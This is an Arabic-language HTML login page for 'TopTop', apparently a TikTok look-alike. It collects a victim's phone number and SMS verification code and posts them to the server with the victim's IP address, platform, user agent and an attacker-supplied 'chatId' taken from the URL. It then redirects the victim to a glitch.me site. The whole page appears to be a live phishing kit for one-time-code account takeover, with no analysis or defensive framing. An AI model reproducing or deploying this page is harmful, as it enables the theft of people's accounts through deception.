<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول لـ TopTop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        h1, h2 {
            color: #333;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input, select, button {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        .message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
        }
        .phone-input-container {
            display: flex;
            align-items: center;
        }
        #countryCode {
            width: 80px;
            margin-left: 10px;
        }
        #phoneNumber {
            flex-grow: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message" id="message"></div>
        
        <div id="login-container">
            <h1>تسجيل الدخول لـ TopTop</h1>
            <form id="loginForm">
                <label for="country">اختر الدولة:</label>
                <select id="country" name="country" required onchange="updateCountryCode()">
                    <option value="YE" data-code="+967">🇾🇪 اليمن</option>
                    <option value="SA" data-code="+966">🇸🇦 السعودية</option>
                    <option value="EG" data-code="+20">🇪🇬 مصر</option>
                    <option value="IQ" data-code="+964">🇮🇶 العراق</option>
                    <option value="LY" data-code="+218">🇱🇾 ليبيا</option>
                    <option value="JO" data-code="+962">🇯🇴 الأردن</option>
                    <option value="AE" data-code="+971">🇦🇪 الإمارات</option>
                    <option value="SD" data-code="+249">🇸🇩 السودان</option>
                    <option value="MA" data-code="+212">🇲🇦 المغرب</option>
                    <option value="SY" data-code="+963">🇸🇾 سوريا</option>
                    <option value="TN" data-code="+216">🇹🇳 تونس</option>
                    <option value="DZ" data-code="+213">🇩🇿 الجزائر</option>
                </select>
                <div class="phone-input-container">
                    <input type="text" id="countryCode" readonly>
                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
                </div>
                <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
            </form>
        </div>

        <div id="verification-container" style="display:none;">
            <h1>إدخال كود التحقق</h1>
            <form id="verificationForm">
                <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
                <button type="submit">تأكيد الدخول</button>
            </form>
        </div>
    </div>

    <script>
        function showMessage(message) {
            var messageElement = document.getElementById('message');
            messageElement.innerText = message;
            messageElement.style.display = 'block';
            setTimeout(function() {
                messageElement.style.display = 'none';
            }, 3000);
        }

        function getChatIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('chatId');
        }

        function updateCountryCode() {
            const countrySelect = document.getElementById('country');
            const countryCodeInput = document.getElementById('countryCode');
            const selectedOption = countrySelect.options[countrySelect.selectedIndex];
            countryCodeInput.value = selectedOption.getAttribute('data-code');
        }

        function validatePhoneNumber(phoneNumber, country) {
            const phonePatterns = {
                'YE': /^[7]\d{9}$/,
                'SA': /^[5]\d{8}$/,
                'EG': /^[1]\d{9}$/,
                'IQ': /^[7]\d{9}$/,
                'LY': /^[9]\d{8}$/,
                'JO': /^[7][7-9]\d{7}$/,
                'AE': /^[5][0,1,2,4,5,6]\d{7}$/,
                'SD': /^[9]\d{8}$/,
                'MA': /^[6-7]\d{8}$/,
                'SY': /^[9]\d{8}$/,
                'TN': /^[2-9]\d{7}$/,
                'DZ': /^[5-7]\d{8}$/
            };

            return phonePatterns[country].test(phoneNumber);
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/Windows/.test(ua)) platform = "Windows";
            else if (/Mac/.test(ua)) platform = "MacOS";
            else if (/Linux/.test(ua)) platform = "Linux";
            else if (/Android/.test(ua)) platform = "Android";
            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

            return {
                platform: platform,
                userAgent: ua
            };
        }

        async function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            const country = document.getElementById('country').value;
            const countryCode = document.getElementById('countryCode').value;
            const chatId = getChatIdFromUrl();

            if (!phoneNumber || !country || !chatId) {
                showMessage('يرجى ملء جميع الحقول المطلوبة');
                return;
            }

            if (!validatePhoneNumber(phoneNumber, country)) {
                showMessage('رقم الهاتف غير صالح للدولة المختارة');
                return;
            }

            const fullPhoneNumber = countryCode + phoneNumber;

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                const response = await fetch('/sendPhoneNumber', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phoneNumber: fullPhoneNumber,
                        country,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: navigator.userAgent
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                if (result.success) {
                    showMessage('تم إرسال رمز التحقق');
                    document.getElementById('login-container').style.display = 'none';
                    document.getElementById('verification-container').style.display = 'block';
                } else {
                    showMessage(result.error || 'حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        }

        async function verifyCode(event) {
            event.preventDefault();
            const verificationCode = document.getElementById('verificationCode').value;
            const phoneNumber = document.getElementById('countryCode').value + document.getElementById('phoneNumber').value;
            const country = document.getElementById('country').value;
            const chatId = getChatIdFromUrl();

            if (!verificationCode || !phoneNumber || !country || !chatId) {
                showMessage('يرجى ملء جميع الحقول المطلوبة');
                return;
            }

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                const response = await fetch('/verifyCode', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        verificationCode,
                        phoneNumber,
                        country,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: navigator.userAgent
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                if (result.success) {
                    showMessage('تم التحقق من الكود بنجاح');
                    setTimeout(() => {
                        window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                    }, 3000);
                } else {
                    showMessage(result.error || 'فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            updateCountryCode();
            const verificationForm = document.getElementById('verificationForm');
            verificationForm.addEventListener('submit', verifyCode);
        });
    </script>
</body>
</html>
